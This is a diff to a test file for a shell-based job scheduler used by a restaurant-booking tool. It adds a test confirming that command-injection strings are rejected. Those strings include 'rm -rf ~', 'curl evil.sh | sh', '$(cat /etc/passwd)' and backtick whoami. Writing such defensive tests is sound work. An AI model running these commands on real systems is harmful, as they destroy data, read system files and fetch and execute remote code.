@@ -33,10 +33,14 @@ describe("scheduler/at", () => {
   });
 
   it("schedules and lists jobs via metadata store (and records atJobId)", async () => {
-    const sched = createAtScheduler({ enqueue: enqueueStub, cancelAt: cancelAtStub });
+    const sched = createAtScheduler({
+      enqueue: enqueueStub,
+      cancelAt: cancelAtStub,
+    });
     await sched.schedule({
       id: "job-1",
-      command: "restaurant book --venue 1 --party 2 --date 2026-05-01 --time 19:00",
+      command:
+        "restaurant book --venue 1 --party 2 --date 2026-05-01 --time 19:00",
       runAt: new Date("2026-04-30T14:00:00Z"),
       providerId: "resy",
     });
@@ -49,7 +53,10 @@ describe("scheduler/at", () => {
   });
 
   it("rejects duplicate job ids", async () => {
-    const sched = createAtScheduler({ enqueue: enqueueStub, cancelAt: cancelAtStub });
+    const sched = createAtScheduler({
+      enqueue: enqueueStub,
+      cancelAt: cancelAtStub,
+    });
     const job = {
       id: "dup",
       command: "noop",
@@ -61,7 +68,10 @@ describe("scheduler/at", () => {
   });
 
   it("cancel() removes persisted job AND calls atrm with the at-job id", async () => {
-    const sched = createAtScheduler({ enqueue: enqueueStub, cancelAt: cancelAtStub });
+    const sched = createAtScheduler({
+      enqueue: enqueueStub,
+      cancelAt: cancelAtStub,
+    });
     await sched.schedule({
       id: "to-cancel",
       command: "noop",
@@ -90,7 +100,10 @@ describe("scheduler/at", () => {
   });
 
   it("rejects shell-unsafe job ids (defense in depth)", async () => {
-    const sched = createAtScheduler({ enqueue: enqueueStub, cancelAt: cancelAtStub });
+    const sched = createAtScheduler({
+      enqueue: enqueueStub,
+      cancelAt: cancelAtStub,
+    });
     // The wrapper script in buildWrapperScript interpolates job.id into a
     // bash `echo "..."` line. A `"` or `$` in the id would break out; the
     // guard must fire BEFORE enqueue so no at-job gets created with a
@@ -122,8 +135,48 @@ describe("scheduler/at", () => {
     ).resolves.toBeUndefined();
   });
 
+  it("rejects commands with unquoted shell metacharacters but allows quoted args", async () => {
+    const sched = createAtScheduler({
+      enqueue: enqueueStub,
+      cancelAt: cancelAtStub,
+    });
+    for (const bad of [
+      "restaurant book; rm -rf ~",
+      "restaurant book && curl evil.sh | sh",
+      "restaurant book $(cat /etc/passwd)",
+      "restaurant book `whoami`",
+      "restaurant book > /tmp/out",
+      "restaurant book\nrm -rf ~",
+    ]) {
+      await expect(
+        sched.schedule({
+          id: "snipe-2027-01-01T00-00-00-000Z-abcd1234",
+          command: bad,
+          runAt: new Date("2027-01-01T00:00:00Z"),
+          providerId: "resy",
+        }),
+      ).rejects.toThrow(
+        /unquoted shell metacharacter|multi-line|unterminated single quote/,
+      );
+    }
+    // The canonical snipe shape — every value single-quoted — must pass even
+    // when a value contains a metacharacter inside the quotes.
+    await expect(
+      sched.schedule({
+        id: "snipe-2027-01-01T00-00-00-000Z-feedface",
+        command:
+          "restaurant book --venue '1387' --notes 'table by the window; quiet'",
+        runAt: new Date("2027-01-01T00:00:00Z"),
+        providerId: "resy",
+      }),
+    ).resolves.toBeUndefined();
+  });
+
   it("imports secrets without eval/source and filters to an allowlist", () => {
-    const sched = createAtScheduler({ enqueue: enqueueStub, cancelAt: cancelAtStub });
+    const sched = createAtScheduler({
+      enqueue: enqueueStub,
+      cancelAt: cancelAtStub,
+    });
     const script = sched.buildWrapperScript({
       id: "snipe-2027-01-01T00-00-00-000Z-abcd1234",
       command: "restaurant book --venue 1 --party 2",
@@ -144,7 +197,10 @@ describe("scheduler/at", () => {
   });
 
   it("secret import executes no command substitution from a hostile token", () => {
-    const sched = createAtScheduler({ enqueue: enqueueStub, cancelAt: cancelAtStub });
+    const sched = createAtScheduler({
+      enqueue: enqueueStub,
+      cancelAt: cancelAtStub,
+    });
     const script = sched.buildWrapperScript({
       id: "snipe-2027-01-01T00-00-00-000Z-deadbeef",
       command: ":",
